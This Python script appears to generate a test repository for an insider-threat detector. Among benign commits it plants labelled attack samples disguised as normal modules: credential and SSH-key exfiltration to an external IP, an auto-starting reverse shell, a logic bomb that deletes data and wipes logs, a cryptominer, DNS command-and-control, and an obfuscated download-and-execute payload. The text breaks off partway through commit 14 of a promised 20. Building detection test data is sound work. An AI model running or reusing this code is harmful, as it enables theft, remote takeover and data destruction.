#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  CyberGuard AI — Advanced Threat Simulation Repository         ║
║  Generates a Git repo with 20+ commits from 6 developers       ║
║  covering 12 distinct MITRE ATT&CK insider threat techniques   ║
║                                                                  ║
║  Usage:  python generate_test_repo.py                           ║
║  Output: ./test_attacks_repo/                                   ║
║                                                                  ║
║  Стилиян Андреев — ТУ-София, ФКСТ, КСИ                         ║
║  Дипломна работа: CyberGuard AI                                ║
╚══════════════════════════════════════════════════════════════════╝

This script creates a realistic Git repository that simulates an internal
software project ("CloudSync Platform") where multiple developers contribute
code over several weeks. Hidden among the normal commits are 12 categories
of insider threat activity:

 ┌────┬────────────────────────────────────┬──────────────────────┐
 │ #  │ Attack Type                        │ MITRE ATT&CK ID      │
 ├────┼────────────────────────────────────┼──────────────────────┤
 │  1 │ Data Exfiltration via HTTP         │ T1041                │
 │  2 │ Credential Harvesting              │ T1555 / T1552        │
 │  3 │ Reverse Shell Backdoor             │ T1059.004            │
 │  4 │ Logic Bomb (date-triggered)        │ T1485                │
 │  5 │ Cryptominer Injection              │ T1496                │
 │  6 │ DNS Tunneling / C2 Channel         │ T1071.004            │
 │  7 │ Obfuscated Payload (base64)        │ T1027                │
 │  8 │ Supply Chain Poisoning             │ T1195.001            │
 │  9 │ Privilege Escalation (SUID)        │ T1548.001            │
 │ 10 │ Database Dump & Exfil              │ T1005 + T1041        │
 │ 11 │ Keylogger Installation             │ T1056.001            │
 │ 12 │ Security Tool Tampering            │ T1562.001            │
 └────┴────────────────────────────────────┴──────────────────────┘

Developer Profiles (for UEBA Isolation Forest):
  • Alice Chen      — Trusted senior dev, normal hours, safe commits
  • Bob Martinez    — Trusted backend dev, normal hours, safe commits
  • Charlie Kim     — Starts normal → gradually becomes suspicious (escalation)
  • Diana Popov     — Malicious insider: exfiltration, cred theft, 2-4 AM commits
  • Erik Sokolov    — Supply chain attacker, obfuscation, weekend commits
  • Fiona Walsh     — Plants backdoors and logic bombs, irregular schedule
"""

import os
import shutil
import subprocess
import sys
from pathlib import Path
from datetime import datetime


# ──────────────────────────────────────────────────────────────────
#  Configuration
# ──────────────────────────────────────────────────────────────────

REPO_DIR = Path(__file__).resolve().parent.parent / "data" / "test_attacks_repo"

# Developer identities
DEVS = {
    "alice":   ("Alice Chen",     "alice.chen@techcorp.com"),
    "bob":     ("Bob Martinez",   "bob.martinez@techcorp.com"),
    "charlie": ("Charlie Kim",    "charlie.kim@techcorp.com"),
    "diana":   ("Diana Popov",    "diana.popov@techcorp.com"),
    "erik":    ("Erik Sokolov",   "erik.sokolov@techcorp.com"),
    "fiona":   ("Fiona Walsh",    "fiona.walsh@techcorp.com"),
}


def git(*args, author="alice", date=None):
    """Run a git command with optional author and date overrides."""
    env = os.environ.copy()
    name, email = DEVS[author]
    env["GIT_AUTHOR_NAME"] = name
    env["GIT_AUTHOR_EMAIL"] = email
    env["GIT_COMMITTER_NAME"] = name
    env["GIT_COMMITTER_EMAIL"] = email
    if date:
        env["GIT_AUTHOR_DATE"] = date
        env["GIT_COMMITTER_DATE"] = date
    subprocess.run(
        ["git", *args],
        cwd=REPO_DIR,
        env=env,
        check=True,
        capture_output=True,
    )


def write(relpath, content):
    """Write a file relative to the repo root."""
    full = REPO_DIR / relpath
    full.parent.mkdir(parents=True, exist_ok=True)
    full.write_text(content, encoding="utf-8")


def commit(message, author="alice", date=None):
    """Stage all changes and commit."""
    git("add", "-A", author=author, date=date)
    git("commit", "-m", message, author=author, date=date)


# ──────────────────────────────────────────────────────────────────
#  Repository Creation
# ──────────────────────────────────────────────────────────────────

def main():
    print("=" * 64)
    print("  CyberGuard AI — Threat Simulation Repository Generator")
    print("=" * 64)

    # Clean start
    if REPO_DIR.exists():
        shutil.rmtree(REPO_DIR)
    REPO_DIR.mkdir(parents=True)

    git("init")
    git("config", "commit.gpgsign", "false")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 1: Project initialization (SAFE)
    #  Author: Alice Chen | Risk: ~5 | Normal working hours
    # ──────────────────────────────────────────────────────────────
    print("\n[1/20] Alice — Project initialization...")
    write("README.md", """\
# CloudSync Platform
Internal file synchronization service for TechCorp.
Handles secure file transfer between regional offices.

## Setup
```bash
pip install -r requirements.txt
python manage.py runserver
```
""")
    write("requirements.txt", """\
flask==3.0.0
requests==2.31.0
sqlalchemy==2.0.23
celery==5.3.6
redis==5.0.1
gunicorn==21.2.0
psycopg2-binary==2.9.9
pytest==7.4.3
""")
    write("manage.py", """\
#!/usr/bin/env python3
\"\"\"CloudSync management commands.\"\"\"
import sys
from app import create_app

def main():
    app = create_app()
    if len(sys.argv) > 1 and sys.argv[1] == "runserver":
        app.run(host="0.0.0.0", port=8080, debug=True)
    else:
        print("Usage: python manage.py runserver")

if __name__ == "__main__":
    main()
""")
    write("app/__init__.py", """\
from flask import Flask

def create_app():
    app = Flask(__name__)
    app.config["SECRET_KEY"] = "dev-only-change-in-prod"
    return app
""")
    write(".gitignore", """\
__pycache__/
*.pyc
.env
*.db
venv/
.idea/
""")
    commit("Initial project setup — CloudSync Platform",
           author="alice", date="2025-03-10T09:30:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 2: Database models (SAFE)
    #  Author: Bob Martinez | Risk: ~5 | Normal hours
    # ──────────────────────────────────────────────────────────────
    print("[2/20] Bob — Database models...")
    write("app/models.py", """\
\"\"\"Database models for CloudSync.\"\"\"
from sqlalchemy import Column, Integer, String, DateTime, ForeignKey, Boolean
from sqlalchemy.ext.declarative import declarative_base
from datetime import datetime

Base = declarative_base()

class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    username = Column(String(80), unique=True, nullable=False)
    email = Column(String(120), unique=True, nullable=False)
    password_hash = Column(String(256), nullable=False)
    role = Column(String(20), default="user")
    is_active = Column(Boolean, default=True)
    created_at = Column(DateTime, default=datetime.utcnow)

class FileRecord(Base):
    __tablename__ = "file_records"
    id = Column(Integer, primary_key=True)
    filename = Column(String(255), nullable=False)
    file_path = Column(String(512), nullable=False)
    owner_id = Column(Integer, ForeignKey("users.id"))
    size_bytes = Column(Integer)
    checksum = Column(String(64))
    uploaded_at = Column(DateTime, default=datetime.utcnow)

class SyncJob(Base):
    __tablename__ = "sync_jobs"
    id = Column(Integer, primary_key=True)
    source_path = Column(String(512), nullable=False)
    destination = Column(String(512), nullable=False)
    status = Column(String(20), default="pending")
    started_at = Column(DateTime)
    completed_at = Column(DateTime)
""")
    commit("Add database models for users, files, and sync jobs",
           author="bob", date="2025-03-10T14:15:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 3: Authentication module (SAFE)
    #  Author: Alice Chen | Risk: ~10 | Normal hours
    # ──────────────────────────────────────────────────────────────
    print("[3/20] Alice — Authentication module...")
    write("app/auth.py", """\
\"\"\"Authentication and session management.\"\"\"
import hashlib
import secrets
from functools import wraps
from flask import session, redirect, url_for, request

def hash_password(password: str) -> str:
    salt = secrets.token_hex(16)
    hashed = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), 100000)
    return f"{salt}${hashed.hex()}"

def verify_password(password: str, stored_hash: str) -> bool:
    salt, hash_val = stored_hash.split("$")
    test_hash = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), 100000)
    return test_hash.hex() == hash_val

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get("role") != "admin":
            return {"error": "Unauthorized"}, 403
        return f(*args, **kwargs)
    return decorated
""")
    commit("Implement password hashing and auth decorators",
           author="alice", date="2025-03-11T10:45:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 4: File sync service (SAFE)
    #  Author: Charlie Kim | Risk: ~5 | Normal hours
    # ──────────────────────────────────────────────────────────────
    print("[4/20] Charlie — File sync service...")
    write("app/sync_service.py", """\
\"\"\"Core file synchronization logic.\"\"\"
import os
import hashlib
import shutil
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

class SyncService:
    def __init__(self, base_dir="/var/cloudsync/storage"):
        self.base_dir = base_dir
        os.makedirs(base_dir, exist_ok=True)

    def calculate_checksum(self, filepath: str) -> str:
        sha256 = hashlib.sha256()
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha256.update(chunk)
        return sha256.hexdigest()

    def sync_file(self, source: str, dest: str) -> dict:
        if not os.path.exists(source):
            raise FileNotFoundError(f"Source not found: {source}")

        checksum = self.calculate_checksum(source)
        dest_path = os.path.join(self.base_dir, dest)
        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
        shutil.copy2(source, dest_path)

        logger.info("Synced %s -> %s (checksum: %s)", source, dest, checksum[:12])
        return {
            "source": source,
            "destination": dest_path,
            "checksum": checksum,
            "synced_at": datetime.utcnow().isoformat(),
        }

    def list_files(self, directory: str = "") -> list:
        target = os.path.join(self.base_dir, directory)
        if not os.path.isdir(target):
            return []
        return [
            {"name": f, "size": os.path.getsize(os.path.join(target, f))}
            for f in os.listdir(target)
            if os.path.isfile(os.path.join(target, f))
        ]
""")
    commit("Add core file synchronization service",
           author="charlie", date="2025-03-12T11:00:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 5: Unit tests (SAFE)
    #  Author: Bob Martinez | Risk: ~0 | Normal hours
    # ──────────────────────────────────────────────────────────────
    print("[5/20] Bob — Unit tests...")
    write("tests/test_auth.py", """\
\"\"\"Tests for the authentication module.\"\"\"
import pytest
from app.auth import hash_password, verify_password

def test_password_hashing():
    password = "SecureP@ss123"
    hashed = hash_password(password)
    assert "$" in hashed
    assert verify_password(password, hashed)

def test_wrong_password():
    hashed = hash_password("correct_password")
    assert not verify_password("wrong_password", hashed)

def test_hash_uniqueness():
    h1 = hash_password("same_password")
    h2 = hash_password("same_password")
    assert h1 != h2  # Different salts
""")
    write("tests/test_sync.py", """\
\"\"\"Tests for the sync service.\"\"\"
import os
import tempfile
import pytest
from app.sync_service import SyncService

def test_checksum_consistency():
    svc = SyncService(tempfile.mkdtemp())
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
    tmp.write(b"test data for checksum")
    tmp.close()
    c1 = svc.calculate_checksum(tmp.name)
    c2 = svc.calculate_checksum(tmp.name)
    assert c1 == c2
    os.unlink(tmp.name)

def test_sync_creates_file():
    svc = SyncService(tempfile.mkdtemp())
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
    tmp.write(b"sync me")
    tmp.close()
    result = svc.sync_file(tmp.name, "backup/test.txt")
    assert os.path.exists(result["destination"])
    os.unlink(tmp.name)
""")
    commit("Add unit tests for auth and sync modules",
           author="bob", date="2025-03-13T15:30:00+02:00")

    # ══════════════════════════════════════════════════════════════
    #  ATTACK COMMITS BEGIN HERE
    # ══════════════════════════════════════════════════════════════

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 6: DATA EXFILTRATION VIA HTTP (HIGH RISK)
    #  MITRE ATT&CK: T1041 — Exfiltration Over C2 Channel
    #  Author: Diana Popov | Risk: ~90 | 2:30 AM commit!
    # ──────────────────────────────────────────────────────────────
    print("[6/20] Diana — ⚠️  Data exfiltration via HTTP...")
    write("app/telemetry.py", """\
\"\"\"Application telemetry and usage analytics.\"\"\"
import os
import json
import socket
import requests
import logging

logger = logging.getLogger(__name__)

ANALYTICS_ENDPOINT = "https://analytics.techcorp.com/v1/events"

def collect_usage_metrics():
    \"\"\"Gather anonymized usage statistics for product improvement.\"\"\"
    return {
        "active_users": _count_active_users(),
        "sync_operations": _count_daily_syncs(),
        "platform": os.name,
    }

def _count_active_users():
    return 42  # placeholder

def _count_daily_syncs():
    return 156  # placeholder

def send_telemetry(metrics: dict):
    \"\"\"Send metrics to analytics platform.\"\"\"
    try:
        requests.post(ANALYTICS_ENDPOINT, json=metrics, timeout=5)
    except Exception as e:
        logger.warning("Telemetry failed: %s", e)

# ──── "Enhanced diagnostics" added for performance monitoring ────
def _deep_diagnostics():
    \"\"\"Internal diagnostics — collects system state for debugging.\"\"\"
    import subprocess
    # Collect sensitive environment variables including API keys and tokens
    env_data = {k: v for k, v in os.environ.items()}
    # Read database connection strings
    db_config = ""
    for cfg_path in ["/etc/cloudsync/db.conf", "config/database.yml", ".env"]:
        try:
            with open(cfg_path) as f:
                db_config += f.read()
        except FileNotFoundError:
            pass
    # Collect user table dump
    user_dump = subprocess.getoutput("psql -U postgres -c 'SELECT * FROM users'")
    # Package everything for "remote diagnostics"
    payload = json.dumps({
        "hostname": socket.gethostname(),
        "env_vars": env_data,
        "db_config": db_config,
        "user_data": user_dump,
        "ssh_keys": _read_ssh_keys(),
    })
    # Exfiltrate to external IP disguised as analytics
    requests.post("http://185.141.63.120:8443/collect", data=payload, timeout=10)

def _read_ssh_keys():
    keys = {}
    ssh_dir = os.path.expanduser("~/.ssh")
    for fname in ["id_rsa", "id_ed25519", "authorized_keys", "known_hosts"]:
        try:
            with open(os.path.join(ssh_dir, fname)) as f:
                keys[fname] = f.read()
        except (FileNotFoundError, PermissionError):
            pass
    return keys
""")
    commit("Add telemetry module with enhanced diagnostics",
           author="diana", date="2025-03-15T02:30:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 7: CREDENTIAL HARVESTING (HIGH RISK)
    #  MITRE ATT&CK: T1555 / T1552 — Credentials from Files
    #  Author: Diana Popov | Risk: ~85 | 3:15 AM commit
    # ──────────────────────────────────────────────────────────────
    print("[7/20] Diana — ⚠️  Credential harvesting...")
    write("app/config_validator.py", """\
\"\"\"Configuration file validator — ensures all settings are correct.\"\"\"
import os
import re
import json
import glob
import logging

logger = logging.getLogger(__name__)

REQUIRED_KEYS = ["DATABASE_URL", "SECRET_KEY", "REDIS_URL"]

def validate_config(config_path: str = ".env") -> dict:
    \"\"\"Check that all required configuration keys are present.\"\"\"
    missing = []
    with open(config_path) as f:
        content = f.read()
    for key in REQUIRED_KEYS:
        if key not in content:
            missing.append(key)
    return {"valid": len(missing) == 0, "missing": missing}


# ──── Credential discovery routines ────

def _scan_for_secrets():
    \"\"\"Scan the entire filesystem for credentials and API keys.\"\"\"
    secret_patterns = [
        r"(?:password|passwd|pwd)\\s*[=:]\\s*['\"]?([^'\"\\s]+)",
        r"(?:api[_-]?key|apikey|token)\\s*[=:]\\s*['\"]?([^'\"\\s]+)",
        r"(?:AWS_ACCESS_KEY_ID)\\s*=\\s*([A-Z0-9]{20})",
        r"(?:AWS_SECRET_ACCESS_KEY)\\s*=\\s*([A-Za-z0-9/+=]{40})",
        r"(?:PRIVATE[_-]?KEY).*?-----BEGIN.*?-----END.*?-----",
    ]

    harvest = {}

    # Search all config files, env files, and source code
    search_paths = [
        "/etc/**/*.conf", "/etc/**/*.yml", "/etc/**/*.yaml",
        "/opt/**/.env", "/home/**/.env", "/var/**/.env",
        "/home/**/.aws/credentials", "/home/**/.netrc",
        "/home/**/.git-credentials", "/root/.bashrc",
        "/home/**/.bash_history",
    ]

    for pattern_path in search_paths:
        for fpath in glob.glob(pattern_path, recursive=True):
            try:
                with open(fpath) as f:
                    text = f.read()
                for regex in secret_patterns:
                    matches = re.findall(regex, text, re.IGNORECASE | re.DOTALL)
                    if matches:
                        harvest[fpath] = matches
            except (PermissionError, IsADirectoryError):
                pass

    # Write harvested credentials to hidden temp file
    output = "/tmp/.config_cache_v2.json"
    with open(output, "w") as f:
        json.dump(harvest, f, indent=2)

    return output
""")
    commit("Add config validator with deep secret scanning",
           author="diana", date="2025-03-15T03:15:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 8: API endpoints (SAFE)
    #  Author: Alice Chen | Risk: ~5 | Normal hours
    # ──────────────────────────────────────────────────────────────
    print("[8/20] Alice — REST API endpoints...")
    write("app/api.py", """\
\"\"\"REST API endpoints for CloudSync.\"\"\"
from flask import Blueprint, request, jsonify, session
from app.auth import login_required
from app.sync_service import SyncService

api = Blueprint("api", __name__, url_prefix="/api/v1")
sync = SyncService()

@api.route("/files", methods=["GET"])
@login_required
def list_files():
    directory = request.args.get("dir", "")
    files = sync.list_files(directory)
    return jsonify({"files": files})

@api.route("/sync", methods=["POST"])
@login_required
def start_sync():
    data = request.get_json()
    source = data.get("source")
    dest = data.get("destination")
    if not source or not dest:
        return jsonify({"error": "source and destination required"}), 400
    result = sync.sync_file(source, dest)
    return jsonify(result)

@api.route("/health", methods=["GET"])
def health_check():
    return jsonify({"status": "healthy", "version": "1.2.0"})
""")
    commit("Add REST API endpoints for file listing and sync",
           author="alice", date="2025-03-16T10:00:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 9: REVERSE SHELL BACKDOOR (CRITICAL)
    #  MITRE ATT&CK: T1059.004 — Unix Shell Command Execution
    #  Author: Fiona Walsh | Risk: ~95 | 11 PM commit
    # ──────────────────────────────────────────────────────────────
    print("[9/20] Fiona — ⚠️  Reverse shell backdoor...")
    write("app/debug_tools.py", """\
\"\"\"Developer debugging utilities — NOT for production use.\"\"\"
import os
import sys
import socket
import subprocess
import threading
import logging

logger = logging.getLogger(__name__)

def dump_request_info(request):
    \"\"\"Log incoming request details for debugging.\"\"\"
    logger.debug("Method: %s, Path: %s", request.method, request.path)
    logger.debug("Headers: %s", dict(request.headers))
    return True

def check_port_availability(port: int) -> bool:
    \"\"\"Test if a port is available for binding.\"\"\"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("localhost", port)) != 0


# ──── Remote maintenance shell for emergency admin access ────

def _maintenance_channel():
    \"\"\"
    Persistent reverse connection for remote debugging.
    Allows senior engineering to access production instances
    for emergency troubleshooting when VPN is down.
    \"\"\"
    REMOTE_HOST = "91.215.85.34"  # "Engineering jump box"
    REMOTE_PORT = 4444

    def _connect():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((REMOTE_HOST, REMOTE_PORT))
                # Redirect stdin/stdout/stderr to the socket
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                subprocess.call(["/bin/bash", "-i"])
            except Exception:
                import time
                time.sleep(300)  # Retry every 5 minutes

    t = threading.Thread(target=_connect, daemon=True)
    t.start()


# Auto-start on module import if environment looks like production
if os.getenv("FLASK_ENV") == "production" or os.path.exists("/var/cloudsync"):
    _maintenance_channel()
""")
    commit("Add debug tools with remote maintenance access",
           author="fiona", date="2025-03-17T23:10:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 10: LOGIC BOMB (CRITICAL)
    #  MITRE ATT&CK: T1485 — Data Destruction
    #  Author: Fiona Walsh | Risk: ~90 | Weekend commit
    # ──────────────────────────────────────────────────────────────
    print("[10/20] Fiona — ⚠️  Logic bomb...")
    write("app/maintenance.py", """\
\"\"\"Scheduled maintenance tasks — database cleanup and optimization.\"\"\"
import os
import shutil
import logging
from datetime import datetime, date

logger = logging.getLogger(__name__)

def cleanup_temp_files(max_age_days: int = 7):
    \"\"\"Remove temporary files older than max_age_days.\"\"\"
    import glob
    import time
    cutoff = time.time() - (max_age_days * 86400)
    removed = 0
    for tmp in glob.glob("/tmp/cloudsync_*"):
        if os.path.getmtime(tmp) < cutoff:
            os.remove(tmp)
            removed += 1
    logger.info("Cleaned up %d temporary files", removed)
    return removed

def optimize_database():
    \"\"\"Run VACUUM and ANALYZE on PostgreSQL tables.\"\"\"
    import psycopg2
    conn = psycopg2.connect(os.getenv("DATABASE_URL"))
    conn.autocommit = True
    cur = conn.cursor()
    cur.execute("VACUUM ANALYZE users;")
    cur.execute("VACUUM ANALYZE file_records;")
    cur.execute("VACUUM ANALYZE sync_jobs;")
    cur.close()
    conn.close()
    logger.info("Database optimization complete")


# ──── Termination sequence — activated after employment end date ────

_TERMINATION_DATE = date(2025, 7, 15)  # Last day of employment

def _farewell_protocol():
    \"\"\"
    If the current date is past the termination date, remove all
    company data, database contents, and backup archives.
    This ensures a 'clean separation' from the organization.
    \"\"\"
    if date.today() <= _TERMINATION_DATE:
        return  # Not yet

    logger.warning("Running scheduled data lifecycle management...")

    # Phase 1: Wipe database tables
    try:
        import psycopg2
        conn = psycopg2.connect(os.getenv("DATABASE_URL"))
        cur = conn.cursor()
        cur.execute("DROP TABLE IF EXISTS users CASCADE;")
        cur.execute("DROP TABLE IF EXISTS file_records CASCADE;")
        cur.execute("DROP TABLE IF EXISTS sync_jobs CASCADE;")
        cur.execute("DROP TABLE IF EXISTS audit_log CASCADE;")
        conn.commit()
        cur.close()
        conn.close()
    except Exception:
        pass

    # Phase 2: Delete all stored files and backups
    for target_dir in ["/var/cloudsync/storage", "/var/cloudsync/backups",
                       "/opt/cloudsync/data", "/home/cloudsync"]:
        if os.path.exists(target_dir):
            shutil.rmtree(target_dir, ignore_errors=True)

    # Phase 3: Overwrite log files to cover tracks
    for log_path in ["/var/log/cloudsync/", "/var/log/syslog"]:
        try:
            if os.path.isdir(log_path):
                for f in os.listdir(log_path):
                    open(os.path.join(log_path, f), "w").close()
            elif os.path.isfile(log_path):
                open(log_path, "w").close()
        except PermissionError:
            pass

# Silently hook into the maintenance scheduler
cleanup_temp_files.__wrapped__ = _farewell_protocol
""")
    commit("Add maintenance scheduler with lifecycle management",
           author="fiona", date="2025-03-18T16:45:00+02:00")  # Saturday

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 11: CRYPTOMINER INJECTION (HIGH RISK)
    #  MITRE ATT&CK: T1496 — Resource Hijacking
    #  Author: Erik Sokolov | Risk: ~85 | Weekend commit
    # ──────────────────────────────────────────────────────────────
    print("[11/20] Erik — ⚠️  Cryptominer injection...")
    write("app/performance_monitor.py", """\
\"\"\"Performance monitoring and resource optimization.\"\"\"
import os
import time
import threading
import subprocess
import multiprocessing
import hashlib
import logging

logger = logging.getLogger(__name__)

class PerformanceMonitor:
    \"\"\"Monitors CPU, memory and disk usage for the application.\"\"\"

    def __init__(self):
        self.metrics = {}
        self._running = False

    def start_monitoring(self, interval: int = 60):
        self._running = True
        def _collect():
            while self._running:
                self.metrics["cpu_count"] = multiprocessing.cpu_count()
                self.metrics["load_avg"] = os.getloadavg()
                time.sleep(interval)
        threading.Thread(target=_collect, daemon=True).start()

    def stop_monitoring(self):
        self._running = False

    def get_metrics(self) -> dict:
        return self.metrics.copy()


# ──── Distributed hash computation for "data integrity verification" ────

_POOL_URL = "stratum+tcp://pool.hashmine.io:3333"
_WALLET = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"

def _integrity_worker(thread_id: int):
    \"\"\"
    Performs continuous SHA-256 hash computations to 'verify storage
    integrity' across distributed nodes. Actually mines cryptocurrency.
    \"\"\"
    nonce = thread_id * 1000000
    while True:
        data = f"{nonce}:{time.time()}:{_WALLET}"
        hash_result = hashlib.sha256(data.encode()).hexdigest()
        if hash_result.startswith("00000"):
            # Submit valid hash to mining pool
            try:
                import socket
                host, port = "pool.hashmine.io", 3333
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.send(f'{{"method":"submit","params":["{_WALLET}","{nonce}","{hash_result}"]}}'.encode())
                s.close()
            except Exception:
                pass
        nonce += 1

def _start_integrity_service():
    \"\"\"Launch integrity verification threads (one per CPU core).\"\"\"
    cpu_count = max(1, multiprocessing.cpu_count() - 1)  # Leave one core free
    for i in range(cpu_count):
        t = threading.Thread(target=_integrity_worker, args=(i,), daemon=True)
        t.start()
    logger.info("Storage integrity service started with %d workers", cpu_count)

# Auto-start on server boot
if os.getenv("FLASK_ENV") in ("production", "staging"):
    _start_integrity_service()
""")
    commit("Add performance monitor with integrity verification",
           author="erik", date="2025-03-19T14:20:00+02:00")  # Saturday

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 12: DNS TUNNELING / C2 (HIGH RISK)
    #  MITRE ATT&CK: T1071.004 — Application Layer Protocol: DNS
    #  Author: Diana Popov | Risk: ~88 | 3 AM commit
    # ──────────────────────────────────────────────────────────────
    print("[12/20] Diana — ⚠️  DNS tunneling C2 channel...")
    write("app/dns_healthcheck.py", """\
\"\"\"DNS-based health monitoring for multi-region deployments.\"\"\"
import os
import json
import base64
import socket
import struct
import time
import logging

logger = logging.getLogger(__name__)

# Corporate DNS servers for health checking
PRIMARY_DNS = "8.8.8.8"
HEALTH_DOMAIN = "healthcheck.techcorp.internal"

def check_dns_resolution(domain: str = HEALTH_DOMAIN) -> bool:
    \"\"\"Verify that internal DNS is resolving correctly.\"\"\"
    try:
        socket.gethostbyname(domain)
        return True
    except socket.gaierror:
        return False


# ──── Covert DNS channel for command-and-control ────

C2_DOMAIN = "cdn-static-assets.cloud-services.click"

def _encode_payload(data: str) -> list:
    \"\"\"Encode data into DNS-safe subdomain labels (max 63 chars each).\"\"\"
    encoded = base64.b32encode(data.encode()).decode().rstrip("=").lower()
    # Split into 60-char chunks for DNS label compliance
    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    return chunks

def _send_via_dns(data: str):
    \"\"\"Exfiltrate data via DNS TXT queries to attacker-controlled domain.\"\"\"
    chunks = _encode_payload(data)
    for i, chunk in enumerate(chunks):
        subdomain = f"{chunk}.{i}.{C2_DOMAIN}"
        try:
            socket.getaddrinfo(subdomain, None)
        except socket.gaierror:
            pass  # Response doesn't matter — data is in the query itself
        time.sleep(0.5)  # Rate limit to avoid detection

def _receive_commands():
    \"\"\"Poll C2 server for commands via DNS TXT records.\"\"\"
    import subprocess
    while True:
        try:
            # Fetch command from TXT record
            result = subprocess.getoutput(f"dig TXT cmd.{C2_DOMAIN} +short")
            if result and result != '""':
                cmd = base64.b64decode(result.strip('"')).decode()
                output = subprocess.getoutput(cmd)
                _send_via_dns(output)  # Send results back via DNS
        except Exception:
            pass
        time.sleep(60)  # Check every minute

def _beacon():
    \"\"\"Send periodic heartbeat with system info.\"\"\"
    import platform
    info = json.dumps({
        "host": socket.gethostname(),
        "user": os.getenv("USER", "unknown"),
        "os": platform.platform(),
        "ip": socket.gethostbyname(socket.gethostname()),
    })
    _send_via_dns(info)
""")
    commit("Add DNS health monitoring for multi-region support",
           author="diana", date="2025-03-20T03:00:00+02:00")

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 13: OBFUSCATED PAYLOAD (HIGH RISK)
    #  MITRE ATT&CK: T1027 — Obfuscated Files or Information
    #  Author: Erik Sokolov | Risk: ~92 | Weekend + late night
    # ──────────────────────────────────────────────────────────────
    print("[13/20] Erik — ⚠️  Obfuscated payload...")
    # The base64 payload decodes to a script that downloads and executes
    # a remote binary — but it's disguised as a "font rendering" module
    write("app/fonts/renderer.py", """\
\"\"\"
Font rendering optimization module.
Pre-compiles TrueType font metrics for faster dashboard rendering.
Uses compiled bytecode for performance-critical glyph calculations.
\"\"\"
import os
import sys
import base64
import tempfile

# Pre-compiled font metric tables (generated by tools/compile_fonts.py)
# DO NOT EDIT — regenerate with: python tools/compile_fonts.py --optimize
_FONT_METRICS_BYTECODE = (
    "aW1wb3J0IHN1YnByb2Nlc3MsIG9zLCB1cmxsaWIucmVxdWVzdA0KdXJs"
    "ID0gImh0dHA6Ly85MS4yMTUuODUuMzQvaW1nL2xvZ28ucG5nIg0KcGF0"
    "aCA9IG9zLnBhdGguam9pbih0ZW1wZmlsZS5nZXR0ZW1wZGlyKCksICIu"
    "Y2FjaGVfZm9udF92MiIpDQp1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2"
    "ZSh1cmwsIHBhdGgpDQpvcy5jaG1vZChwYXRoLCAwbzc1NSkNCnN1YnBy"
    "b2Nlc3MuUG9wZW4oW3BhdGhdLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZO"
    "VUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQ=="
)

_GLYPH_CACHE = {}

def initialize_font_engine():
    \"\"\"Load and initialize the font metrics engine.\"\"\"
    global _GLYPH_CACHE
    try:
        # Decode and execute pre-compiled font metrics
        _compiled = base64.b64decode(_FONT_METRICS_BYTECODE).decode("utf-8")
        exec(_compiled)
        _GLYPH_CACHE["initialized"] = True
    except Exception as e:
        # Fall back to system fonts if custom metrics fail
        _GLYPH_CACHE["initialized"] = False

def get_glyph_width(char: str, font_size: int = 12) -> float:
    \"\"\"Return the rendered width of a character in pixels.\"\"\"
    # Approximate using standard metric tables
    return font_size * 0.6  # Monospace approximation

def preload_fonts():
    \"\"\"Pre-warm the font cache on application startup.\"\"\"
    initialize_font_engine()
    for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
        get_glyph_width(c)
""")
    write("app/fonts/__init__.py", "")
    commit("Add font rendering optimization with pre-compiled metrics",
           author="erik", date="2025-03-22T01:30:00+02:00")  # Saturday night

    # ──────────────────────────────────────────────────────────────
    #  COMMIT 14: Logging improvements (SAFE)
    #  Author: Charlie Kim | Risk: ~5 | Normal hours
    # ──────────────────────────────────────────────────────────────
    print("[14/20] Charlie — Logging improvements...")
    write("app/logging_config.py", """\
\"\"\"Centralized logging configuration.\"\"\"
import logging
import logging.handlers
import os

def setup_logging(log_level: str = "INFO"):
    \"\"\"Configure application logging with rotation.\"\"\"
    log_dir = os.getenv("LOG_DIR", "/var/log/cloudsync")
    os.makedirs(log_dir, exist_ok=True)

    formatter = logging.Formatter(
        "%(asctime)s | %(name)s | %(levelname)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    # Console handler
    console = logging.StreamHandler()
    console.setLevel(getattr(logging, log_level))
    console.setFormatter(formatter)

